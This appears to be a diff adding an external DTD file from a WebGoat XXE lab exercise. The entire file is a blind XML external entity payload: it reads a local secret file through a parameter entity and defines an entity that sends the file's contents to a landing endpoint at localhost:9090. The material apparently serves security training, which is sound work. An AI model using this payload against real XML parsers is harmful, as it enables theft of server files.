@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:/home/nbaars/.webgoat-v8.0.0.M14/XXE/secret.txt">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/landing?text=%file;'>">
+%all;
